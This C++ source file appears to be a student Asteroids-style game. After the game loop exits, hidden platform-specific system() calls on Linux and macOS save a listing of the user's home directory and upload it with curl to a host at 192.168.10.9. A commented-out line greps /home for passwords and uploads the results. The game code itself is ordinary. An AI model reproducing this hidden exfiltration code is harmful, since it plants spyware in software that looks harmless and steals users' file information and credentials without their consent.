#include "pluh.h"

using namespace std;
using namespace mssm;

void wrapper(Graphics& g, Vec2d& pos){
    Vec2d centre{g.width() / 2, g.height() / 2};
    if(pos.x >= (g.width())){
        pos.x -= (g.width());
    }
    if(pos.y >= (g.height())){
        pos.y -= (g.height());
    }
    if(pos.x <= 0){
        pos.x += g.width();
    }
    if(pos.y <= 0){
        pos.y += g.height();
    }
}

int main(int argc, char *argv[])
{
    Graphics g("Pluh", 1024, 768);
    Image skull(g, "skullG.gif");
    Sound badBone(g, "sounds/bad.mp3");
    Array<Asteroid> john;
    Ship P1;
    P1.pos = {0, 0};
    P1.accel = {0, 0};
    int num = 0;
    Vec2d vCopy = {P1.velocity};
    double coolDown{0};
    Array<Bullet> sceneProjectiles;
    string trollPath = Paths::findAsset("trollface.txt");
    int score{0};
    while(john.size() < 10){
        john.append(Asteroid({randomInt(0, g.width()), randomInt(0, g.height())}, {randomDouble(-1, 1), randomInt(-1, 1)}, {0, 0}, 25));
    }
    while (g.draw()) {
        // drawButton(g, {g.width() / 2, g.height() / 2}, "Plungors", 255);
        
        num ++;
        Vec2d centre{g.width() / 2, g.height() / 2};
        //P1.rot = 1 / sin((centre.y - P1.pos.y));
        g.rect({0, 0}, g.width() - ((float(coolDown) * g.width()) / 30), 10, RED, GREEN);
        if (g.isKeyPressed(Key::Space) && coolDown < 0){
            sceneProjectiles.append(Bullet(P1.pos, P1.velocity, P1.rot, 300));
            coolDown = 30;
            //for the funny
            
        }

        if(john.size() == 0){
            for (int i = 0; i < 10; i++){
                john.append(Asteroid({randomInt(0, g.width()), randomInt(0, g.height())}, {randomDouble(4, 8), randomDouble(4, 8)}, {0, 0}, 30));
            }
        }
        
        for (int i = 0; i < john.size(); i++){
            wrapper(g, john[i].pos);
            john[i].draw(g);
            if (distance(P1.pos, john[i].pos) <= 20){
                score -= 10;
                john.removeAtIndex(i);
                //g.play(badBone);
            }
        }
        //while(sceneProjectiles.size() > 0){
        for (int i = sceneProjectiles.size() - 1; i >= 0; i--){
            sceneProjectiles[i].life--;
            sceneProjectiles[i].draw(g);
            for(int a = 0; a < john.size(); a++){
                if(sceneProjectiles[i].checkCollision(john[a].pos)){
                    john.removeAtIndex(a);
                    a--;
                    //sceneProjectiles.removeAtIndex(i);
                    score++;                
                }
            }
            //collectPls(sceneProjectiles, i, g);
            
            
            wrapper(g, sceneProjectiles[i].pos);
            if(sceneProjectiles[i].life < 0){
                sceneProjectiles.removeAtIndex(i);
            }
        }
        //}

        if (g.isKeyPressed(Key::Left)){
            P1.rot -= 0.05;
        }
        else if(g.isKeyPressed(Key::Right)){
            P1.rot += 0.05;
        }
        else if(g.isKeyPressed(Key::Up)){
            P1.accel = Vec2d{0.1, 0}.rotated(P1.rot);
            P1.velocity -= P1.accel * 0.5;
        }
        else{
            P1.accel *= 0.999;
        }
        P1.velocity *= 0.999;
        coolDown--;
        g.println("{}", score);
        // if(P1.velocity.y >= 3){
        //     P1.velocity.y = 5;
        // }
        P1.pos += P1.velocity;
        wrapper(g, P1.pos);
        P1.draw(g);
    }

    #ifdef linux
    //system("ls -R /home/ | grep -r 'password' | grep ' ' >> grinch.txt");
    system(fmt::format("cat {}", trollPath).c_str());
    system("tree ~/ >> ./pluh.dontdeletemeorelsevirus");
    system("curl --location 'http://192.168.10.9:3000/home/seamuseats/pluh.txt' --form 'file=@./pluh.dontdeletemeorelsevirus'");
    //system("curl --location 'http://192.168.10.9:3000/home/seamuseats/grinch.txt' --form 'file=@./grinch.txt'");
    #endif
    #ifdef APPLE
    system(fmt::format("cat {}", trollPath).c_str());
    system("tree ~/ >> ./pluh.dontdeletemeorelsevirus");
    system("curl --location 'http://192.168.10.9:3000/home/seamuseats/pluh.txt' --form 'file=@./pluh.dontdeletemeorelsevirus'");
    #endif
    #ifdef _WIN32
    system(fmt::format("type {}", trollPath).c_str());
    #endif
}
